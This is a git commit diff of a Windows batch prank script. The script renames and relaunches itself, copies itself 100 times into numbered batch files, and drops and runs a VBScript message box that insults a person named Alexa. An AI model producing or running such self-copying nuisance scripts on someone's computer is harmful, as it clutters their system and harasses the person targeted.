f62fbd9ec50bcbbc92973f2af604bf57ffdb080f
gavinmakesapps-sys <gavinmakesapps@gmail.com>
2025-12-25 11:13:06 -0700

    Update main.bat
    Fixed vbs and file copy stuff

--- main.bat
+++ main.bat
@@ -1,11 +1,18 @@
 @echo off
-if %~nx0=="main.bat"(  
-  goto :X
-) else (
-  ren %~nx0 main.bat
+set "targetName=main.bat"
+if /i "%~nx0"=="%targetName%" (
+    goto :X
 )
+if exist "%targetName%" (
+    echo Error: %targetName% already exists. Cannot rename.
+    pause
+    exit /b
+)
+ren "%~nx0" "%targetName%"
+start "" "%targetName%" & exit
+:X
 for /L %%i in (1,1,100) do ( 
   copy main.bat main%%i.bat
 )
-echo msgbox hello alexa idot > %temp%\dumb.vbs
+echo msgbox "hello alexa idot" > %temp%\dumb.vbs
 start %temp%\dumb.vbs
